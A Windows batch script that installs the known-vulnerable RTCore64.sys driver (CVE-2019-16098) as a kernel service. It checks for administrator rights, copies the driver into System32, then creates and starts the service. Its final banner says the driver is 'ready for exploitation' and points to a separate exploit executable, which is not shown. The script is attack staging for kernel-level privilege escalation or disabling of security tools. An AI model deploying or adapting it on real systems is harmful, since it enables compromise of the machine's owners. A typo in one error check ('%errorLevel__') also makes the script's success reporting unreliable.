@echo off
echo ╔════════════════════════════════════════════════════════════════╗
echo ║                RTCore64.sys Driver Installation                ║
echo ║                    CVE-2019-16098                              ║  
echo ╚════════════════════════════════════════════════════════════════╝
echo.

echo [*] Checking if running as Administrator...
net session >nul 2>&1
if %errorLevel% == 0 (
    echo [+] Running with Administrator privileges
) else (
    echo [!] ERROR: Must run as Administrator!
    echo     Right-click and select "Run as administrator"
    pause
    exit /b 1
)

echo.
echo [*] Checking if RTCore64.sys exists in current directory...
if not exist "RTCore64.sys" (
    echo [!] ERROR: RTCore64.sys not found in current directory
    echo     Please place RTCore64.sys in the same folder as this script
    pause
    exit /b 1
) else (
    echo [+] RTCore64.sys found
)

echo.
echo [*] Copying RTCore64.sys to system32\drivers...
copy "RTCore64.sys" "C:\Windows\System32\drivers\RTCore64.sys" >nul
if %errorLevel% == 0 (
    echo [+] Driver copied successfully
) else (
    echo [!] ERROR: Failed to copy driver
    pause
    exit /b 1
)

echo.
echo [*] Checking if RTCore64 service already exists...
sc query RTCore64 >nul 2>&1
if %errorLevel% == 0 (
    echo [*] Service exists, stopping and deleting...
    sc stop RTCore64 >nul 2>&1
    sc delete RTCore64 >nul 2>&1
    timeout /t 2 >nul
)

echo [*] Creating RTCore64 service...
sc create RTCore64 binPath="C:\Windows\System32\drivers\RTCore64.sys" type=kernel start=demand >nul
if %errorLevel% == 0 (
    echo [+] Service created successfully
) else (
    echo [!] ERROR: Failed to create service
    pause
    exit /b 1
)

echo.
echo [*] Starting RTCore64 service...
sc start RTCore64 >nul 2>&1
if %errorLevel__ == 0 (
    echo [+] RTCore64 service started successfully!
) else (
    echo [!] WARNING: Service may have failed to start
    echo     This is sometimes normal for vulnerable drivers
)

echo.
echo [*] Checking service status...
sc query RTCore64

echo.
echo ╔════════════════════════════════════════════════════════════════╗
echo ║                    INSTALLATION COMPLETE                      ║
echo ║                                                                ║
echo ║  RTCore64.sys is now loaded and ready for exploitation        ║
echo ║  Device accessible at: \\.\RTCore64                          ║
echo ║                                                                ║
echo ║  Run RTCore64_CVE_Final.exe to test the exploit               ║
echo ╚════════════════════════════════════════════════════════════════╝
echo.

echo [*] To uninstall later, run:
echo     sc stop RTCore64
echo     sc delete RTCore64
echo     del "C:\Windows\System32\drivers\RTCore64.sys"

pause 